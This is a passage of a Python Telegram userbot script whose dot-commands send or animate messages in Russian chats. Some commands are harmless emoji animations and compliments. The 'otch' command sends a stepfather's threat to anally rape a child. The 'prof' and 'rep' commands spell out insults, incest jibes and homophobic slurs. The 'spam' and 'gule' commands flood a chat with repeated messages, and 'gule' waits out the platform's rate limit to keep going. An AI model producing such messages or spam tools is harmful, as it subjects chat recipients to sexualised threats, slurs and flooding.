🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
🔲
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲
''')  
        sleep(0.1)
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
''')  
        
  
  
  
  
 #❤️💙🧡💖💝💘💕💗💞
  
@app.on_message(filters.command("comps", prefixes=".") & filters.me)
def comps(app, message):
    for i in range(1):
        sleep(1)
        app.send_message(message.chat.id, f'<b>  ты моя бусиночка💗💞        </b>')
        sleep(0.1)
        app.send_message(message.chat.id, f'<b>  ты моё солнышко❤️💙        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  ты мой лучик💖💝        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  ты любовь всей моей жизни💘💕💗        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  ты мой ангелочек💘💗🧡     </b>')
        sleep(4)
        app.send_message(message.chat.id, f'<b>  ты мое счастье💖        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  когда ты мне пишешь у меня поднымаеться настроение        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  ты самая красивая девачка😎💗        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  ты моя звёздочка✨💟        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  ты мой чертёночек🥺❤️‍🔥        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  ты украла мое сердце💟❣       </b>')
        sleep(4)
        app.send_message(message.chat.id, f'<b>  ты мой цветочек🌹🌸💛       </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  ты мой котёнок😻        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  ты не человек, ты сокровище        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  люблю только тебя🥺❤️‍         </b>')



@app.on_message(filters.command("care", prefixes=".") & filters.me)
def care(app, message):
    for i in range(1):
        sleep(0.01)
        app.send_message(message.chat.id, f'<b>  приветик❤️❤️        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  Как дела котик❤️😺?        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  что делает мой котик?🥺        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  моя зайка поела?❤️🍎        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  как настроение?❤❤️        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'<b>  нечего не болит?❤️        </b>')
        sleep(3)
        app.send_message(message.chat.id, f'''<b>  ──────────────────────
─────▄█▀█▄──▄███▄───── 
────▐█░██████████▌──── 
─────██▒█████████─────
──────▀████████▀────── 
─────────▀██▀─────────        </b>''')
        sleep(3)
        app.send_message(message.chat.id, f'''<b>  это ты:

../\„„./\.
.(='•'= ) .
.(")❤️(").
. \,\„„/,/
. │„„. „│
. /„/„ \„\

.(„)''l l''(„)
. .. ((...
. . . ))..
. . .((..        </b>''')



@app.on_message(filters.command("nowar", prefixes=".") & filters.me)
def nowar(_, msg):
    time = 1
    for i in range(1):
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 vs 🇺🇦🇺🇦🇺🇦🇺🇦
''')
        sleep(1)
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 vs 🇺🇦🇺🇦🇺🇦🇺🇦

эээ
''')
        sleep(1)
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 vs 🇺🇦🇺🇦🇺🇦🇺🇦

эээ ты что?
''')
        sleep(1.5)
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 🤝 🇺🇦🇺🇦🇺🇦🇺🇦

эээ ты что? 
какая война нахуй?
''')
        sleep(1)
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 🤝 🇺🇦🇺🇦🇺🇦🇺🇦

эээ ты что? 
какая война нахуй?
я за мир!
''')
        sleep(1)
        msg.edit(f'''
🇷🇺🇷🇺🇷🇺🇷🇺 🤝 🇺🇦🇺🇦🇺🇦🇺🇦

эээ ты что? 
какая война нахуй?
Я ЗА МИР!🥺
''')
        sleep(1)
        msg.edit(f'''
🇺🇦🇺🇦🇺🇦🇺🇦 🤝 🇺🇦🇺🇦🇺🇦🇺🇦

эээ ты что? 
какая война нахуй?
Я ЗА МИР!🥺

ОЙ
''')
        sleep(1)



@app.on_message(filters.command("snow", prefixes=".") & filters.me)
def snow(_, msg):
    time = 0.6
    for i in range(7):
        msg.edit(f'''
 ❄   
                              ❄
          ❄
                    ❄
         ❄                     ❄
                  ❄
''')
        sleep(0.1)
        msg.edit(f'''
  ❄   
                           ❄
        ❄
                      ❄
           ❄                  ❄
                     ❄
''')
        sleep(0.1)
        msg.edit(f'''
       ❄   
                              ❄
          ❄  
                          ❄
          ❄                     ❄
                
''')
        sleep(0.1)
        msg.edit(f'''
  ❄   
                               ❄
          ❄  
                     ❄
       ❄                    ❄
                  ❄
''')
        sleep(0.1)
        msg.edit(f'''
         ❄   
                      ❄
        ❄
                         ❄
                 ❄            ❄
          ❄
''')
        sleep(0.1)
        


@app.on_message(filters.command("MBI", prefixes=".") & filters.me)
def mbi(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
Стираем тебе память..
''')
        sleep(1)
        msg.edit(f'''
⚫
⚫
⚫
⚫
⚫
''')  
        sleep(0.5)
        msg.edit(f'''
🔴
⚫
⚫
⚫
⚫
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
🔴
⚫
⚫
⚫
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
⚫
🔴
⚫
⚫
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
⚫
⚫
🔴
⚫
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
⚫
⚫
⚫
🔴
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
⚫
⚫
🔴
🔴
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
⚫
🔴
🔴
🔴
''')  
        sleep(0.5)
        msg.edit(f'''
⚫
🔴
🔴
🔴
🔴
''')  
        sleep(0.5)
        msg.edit(f'''
🔴
🔴
🔴
🔴
🔴
''')  
        sleep(1)
        msg.edit(f'''
Загрузка..
''')
        sleep(3)
        msg.edit(f'''
✅Загрузка успешно завершена!
''')
        sleep(1)
        msg.edit(f'''
◼️◼️◼️◼️◼️◼️◼️◼️
◼️привет               ◼️
◼️                           ◼️
◼️                           ◼️
◼️                            ◼️
◼️◼️◼️◼️◼️◼️◼️◼️
''')
        sleep(0.5)
        msg.edit(f'''
◼️◼️◼️◼️◼️◼️◼️◼️
◼️привет               ◼️
◼️помнишь          ◼️
◼️                	       	  ◼️
◼️                            ◼️
◼️◼️◼️◼️◼️◼️◼️◼️
''')
        sleep(0.5)
        msg.edit(f'''
◼️◼️◼️◼️◼️◼️◼️◼️
◼️привет               ◼️
◼️помнишь          ◼️
◼️сотку занимал◼️
◼️                            ◼️
◼️◼️◼️◼️◼️◼️◼️◼️
''')






@app.on_message(filters.command("hui", prefixes=".") & filters.me)
def hui(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
          🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
        🍆🍆🍆
         🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
          🍆🍆🍆
           🍆🍆🍆
            🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
         🍆🍆🍆
          🍆🍆🍆
           🍆🍆🍆
            🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
        🍆🍆🍆
         🍆🍆🍆
          🍆🍆🍆
           🍆🍆🍆
            🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
       🍆🍆🍆
        🍆🍆🍆
         🍆🍆🍆
          🍆🍆🍆
           🍆🍆🍆
            🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
    🍆🍆🍆
      🍆🍆🍆
       🍆🍆🍆
        🍆🍆🍆
         🍆🍆🍆
          🍆🍆🍆
           🍆🍆🍆
            🍆🍆🍆
   🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  
        sleep(0.1)
        msg.edit(f'''
🍆🍆
🍆🍆🍆
  🍆🍆🍆
    🍆🍆🍆
     🍆🍆🍆
      🍆🍆🍆
       🍆🍆🍆
        🍆🍆🍆
         🍆🍆🍆
          🍆🍆🍆
          🍆🍆🍆
    🍆🍆🍆🍆🍆🍆
 🍆🍆🍆  🍆🍆🍆
    🍆🍆        🍆🍆
''')  



@app.on_message(filters.command("otch", prefixes=".") & filters.me)
def otch(app, message):
    for i in range(1):
        sleep(1)
        app.send_message(message.chat.id, f'<b>  ПРИВЕТ        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  Я ТВОЙ ОТЧИМ        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  И ЕСЛИ ТЫ НЕ ЗАСНЁШЬ        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  Я ПРИДУ К ТЕБЕ В КРОВАТКУ        </b>')
        sleep(1)
        app.send_message(message.chat.id, f'<b>  И ВЫЕБУ В ПОПКУ!!!!!!        </b>')





@app.on_message(filters.command("search", prefixes=".") & filters.me)
def search(app, message):
    for i in range(1):
        sleep(0.01)
        app.send_message(message.chat.id, f'<b>  👁‍🗨ПОИСК ТВОЕЙ МАМАШИ..        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  ВНИМАНИЕ МАМАША НЕ НАЙДЕНА!❌        </b>')
        sleep(0.1)
        app.send_message(message.chat.id, f'<b>  🔍 ПОИСК ТВОЕГО БАТИ..        </b>')
        sleep(2)
        app.send_message(message.chat.id, f'<b>  БАТЯ НЕ НАЙДЕН! ❌        </b>')
        sleep(0.01)
        app.send_message(message.chat.id, f'<b>  🔍ПОИСК ТВОЕГО ОТЧИМА..        </b>')
        sleep(0.01)
        app.send_message(message.chat.id, f'<b>  ТВОЙ ОТЧИМ НАЙДЕН! ✅   </b>')
        
        
        
        
@app.on_message(filters.command("withoutyou", prefixes=".") & filters.me)
def withoutyou(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
''')     
        sleep(2)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
''')     
        sleep(1)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
''') 
        sleep(1)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
''') 

        sleep(1)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
😞
''') 

        sleep(2)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
😞
😔
''')  
        sleep(1.5)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
😞
😔
😓
''')  
        sleep(2)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
😞
😔
😓
🥺
''')  
        sleep(1.5)
        msg.edit(f'''
МОЁ НАСТРОЕНИЕ БЕЗ ТЕБЯ🧡
😀
🙃
😌
😞
😔
😓
🥺
😭
''')  
     
        
        
        
        
@app.on_message(filters.command("prof", prefixes=".") & filters.me)
def prof(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
ВАШ ПРОФИЛЬ
''')  
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

Загрузка...
''')  
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН        
''')
        sleep(0.01)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН        
Загрузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
''')
        sleep(0.001)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
Загрузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
''')    
        sleep(0.01)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
Загузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
''')
        sleep(0.01)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
Загрузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
ВАША МАМКА ШЛЮХА
''')
        sleep(0.01)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
ВАША МАМКА ШЛЮХА
Загрузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
ВАША МАМКА ШЛЮХА
ВАШ БРАТ ЕБАЛ ВАС 9 РАЗ
''')
        sleep(0.01)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ  В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
ВАША МАМКА ШЛЮХА
ВАШ БРАТ ЕБАЛ ВАС 9 РАЗ
Загрузка...
''')
        sleep(1)
        msg.edit(f'''
ВАШ ПРОФИЛЬ

ВЫ УЕБАН  
ВАШ ВОЗРАСТ 8 ЛЕТ
ВЫ В 2-ОМ КЛАССЕ
ВАШ БАТЯ УЕБАН
ВАША МАМКА ШЛЮХА
ВАШ БРАТ ЕБАЛ ВАС 9 РАЗ
ВЫ ГЕЙ!
''')
       
        
       
        
@app.on_message(filters.command("rep", prefixes=".") & filters.me)
def rep(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
Ты..''')  
        sleep(1)
        msg.edit(f'''
Говно''') 
        sleep(0.001)
        msg.edit(f'''
залупа''') 
        sleep(0.001)
        msg.edit(f'''
пенис''')  
        sleep(0.001)
        msg.edit(f'''
хер''')  
        sleep(0.001)
        msg.edit(f'''
давалка''')  
        sleep(0.001)
        msg.edit(f'''
хуй''')  
        sleep(0.001)
        msg.edit(f'''
Головка''')  
        sleep(0.001)
        msg.edit(f'''
шлюха''')  
        sleep(0.001)
        msg.edit(f'''
жопа''')  
        sleep(0.001)
        msg.edit(f'''
член''')  
        sleep(0.001)
        msg.edit(f'''
еблан''')  
        sleep(0.001)
        msg.edit(f'''
петух''')  
        sleep(0.001)
        msg.edit(f'''
мудила''')  
        sleep(0.001)
        msg.edit(f'''
Рукоблуд''')  
        sleep(0.001)
        msg.edit(f'''
ссанина''')  
        sleep(0.001)
        msg.edit(f'''
очко''')  
        sleep(0.001)
        msg.edit(f'''
блядун''')  
        sleep(0.001)
        msg.edit(f'''
вагина''')  
        sleep(0.001)
        msg.edit(f'''
Сука''')
        sleep(0.001)
        msg.edit(f'''
ебланище''')
        sleep(0.001)
        msg.edit(f'''
влагалище''')
        sleep(0.001)
        msg.edit(f'''
пердун''')
        sleep(0.001)
        msg.edit(f'''
дрочила(я тож)''')
        sleep(0.001)
        msg.edit(f'''
Пидор''')
        sleep(0.001)
        msg.edit(f'''
пизда''')
        sleep(0.001)
        msg.edit(f'''
туз''')
        sleep(0.001)
        msg.edit(f'''
мудила''')
        sleep(0.001)
        msg.edit(f'''
гомик''')
        sleep(0.001)
        msg.edit(f'''
малафья''')
        sleep(0.001)
        msg.edit(f'''
пилотка''')
        sleep(0.001)
        msg.edit(f'''
манда''')
        sleep(0.001)
        msg.edit(f'''
Анус''')
        sleep(0.001)
        msg.edit(f'''
вагина''')
        sleep(0.001)
        msg.edit(f'''
путана''')
        sleep(0.001)
        msg.edit(f''' 
педрила''')
        sleep(0.001)
        msg.edit(f'''
шалава''')
        sleep(0.001)
        msg.edit(f'''
хуила''')
        sleep(0.001)
        msg.edit(f'''
мошонка''')
        sleep(0.001)
        msg.edit(f'''
елда.''')



@app.on_message(filters.command("numbers", prefixes=".") & filters.me)
def numbers(_, msg):
    time = 0.6
    for i in range(9):
        msg.edit(f'''      
0 1 0 1 0 0 1 0 1 1 0 1 1 0 0
1 0 1 0 1 0 1 0 1 0 1 0 0 1 1
0 1 1 0 0 0 1 1 0 1 0 1 0 0 1
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
''')  
        sleep(0.001)
        msg.edit(f'''      
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
1 0 1 0 1 0 1 0 1 0 1 0 0 1 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 0 0 0 1 1 0 1 0 1 0 0 1
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
''')  
        sleep(0.001)
        msg.edit(f'''      
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
0 1 0 1 0 0 1 0 1 1 0 1 1 0 0
''')  
        sleep(0.001)
        msg.edit(f'''      
0 0 1 0 1 0 1 1 0 0 1 1 0 1 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 1 1 0 1 1 1 1 0 1 0 1 0
''')  
        sleep(0.001)
        msg.edit(f'''      
1 0 0 1 1 0 1 0 0 1 0 1 1 0 1
0 1 0 1 0 0 1 1 1 1 0 1 1 0 0
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 1 1 0 1 1 1 1 0 1 0 1 0
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
''')  
        sleep(0.001)
        msg.edit(f'''      
0 1 1 0 0 0 1 1 0 1 0 1 0 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 0 1 1 0 1 0 0 1 0 1 1 0 1
''')  
        sleep(0.001)
        msg.edit(f'''      
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 0 0 0 1 1 0 1 0 1 0 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
''') 
        sleep(0.001)
        msg.edit(f'''      
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
0 0 1 0 1 0 1 1 0 0 1 1 0 1 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
''')
        sleep(0.001)
        msg.edit(f'''      
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
1 0 0 1 1 0 1 0 0 1 0 1 1 0 1
0 1 0 1 0 0 1 1 1 1 0 1 1 0 0
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 1 1 0 1 1 1 1 0 1 0 1 0
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
''')
        sleep(0.001)
        msg.edit(f'''      
0 1 1 0 1 0 0 1 1 0 1 1 0 1 0
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
0 0 1 0 1 0 1 1 0 0 1 1 0 1 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
''')
        sleep(0.001)
        msg.edit(f'''      
1 0 0 1 0 1 1 0 1 0 1 0 1 1 0
0 0 1 0 1 0 1 1 0 0 1 1 0 1 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
''')
        sleep(0.001)
        msg.edit(f'''      
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
1 0 1 0 1 0 1 0 1 0 1 0 0 1 1
0 1 1 1 0 0 1 0 1 1 0 1 0 1 0
0 1 1 0 0 0 1 1 0 1 0 1 0 0 1
''')
        sleep(0.001)
        msg.edit(f'''      
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
1 1 0 1 0 1 1 1 0 1 0 0 0 1 0
0 0 1 0 1 0 1 1 0 0 1 1 0 1 1
1 0 1 0 0 1 1 0 1 0 1 0 1 0 1
1 0 1 0 1 0 0 1 1 0 0 0 1 0 1
1 0 0 1 1 0 1 0 0 0 1 1 1 0 1
''')




@app.on_message(filters.command("eroglifs", prefixes=".") & filters.me)
def eroglifs(_, msg):
    time = 0.6
    for i in range(9):
        msg.edit(f'''      
내가엿푸틴에서항문이빌
어먹을도대체나는해치지
않을것이그의빌어먹나문
나를메시서보낸도더런난
당신과그녀가그렇게니라
''')  
        sleep(0.001)
        msg.edit(f'''
난기다리고있을때기대에
대한지불을납품에어떤채
팅또는토요일에그것은로
봇을켜는현재에썼고그런
다음필요가없당신이일주 
''')
        sleep(0.001)
        msg.edit(f'''
그런데왜내가나에게필요
한모든일을한기회가있다
는것을내가모든일을했다
고당신의가족과아이들에
게말해야합니까일에그에
''')
        sleep(0.001)
        msg.edit(f'''
아니면너무오래전에이메
일주소로편지를쓸수있지
기회를가지고있지않았다
우리가만나고토론할수있
것입니다그후년되지않습
''')
        sleep(0.001)
        msg.edit(f'''
것입니다그후년되지않습
고당신의가족과아이들에
는것을내가모든일을했다
내가엿푸틴에서항문이빌
어먹을도대체나는해치지
''')
        







@app.on_message(filters.command("random", prefixes=".") & filters.me)
def rand(_, msg):
    random1 = msg.text.split(" ", maxsplit=2)
    
    del random1[0]
    
    random2 = random1[0]
    random3 = random1[1]
    
    random4 = random.randint(int(random2), int(random3))
    
    msg.edit(f"<b> Цыгане показали число: {random4}</b>")
        
        
    
@app.on_message(filters.command("gule", prefixes=".") & filters.me)
def gule(app, message):
    app.send_message(message.chat.id,f'<b>1000-7=?</b>')
    sleep(4)
    i = 1000
    while i > 0:
        try:
            app.send_message(message.chat.id, f'{i} - 7 = {i-7}')
        except FloodWait as e:
            sleep(e.x)

        i -= 7
        sleep(0)


@app.on_message(filters.command("spam", prefixes=".") & filters.me)
def spam(app, message):
    spam1 = message.text.split("\n", maxsplit=3)
    del spam1[0]
    print(spam1)
    spam2 = spam1[0]
    spam4 = spam1[1]
    for i in range(int(spam4)):
        app.send_message(message.chat.id, f"{spam2}")
        




@app.on_message(filters.command("go", prefixes=".") & filters.me)
def betaloves(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''      
хммммм        ''')  
        sleep(3)
        msg.edit(f'''      
го..        ''')  
        sleep(3)
        msg.edit(f'''      
e..        ''')  
        sleep(3)
        msg.edit(f'''      
б..        ''')  
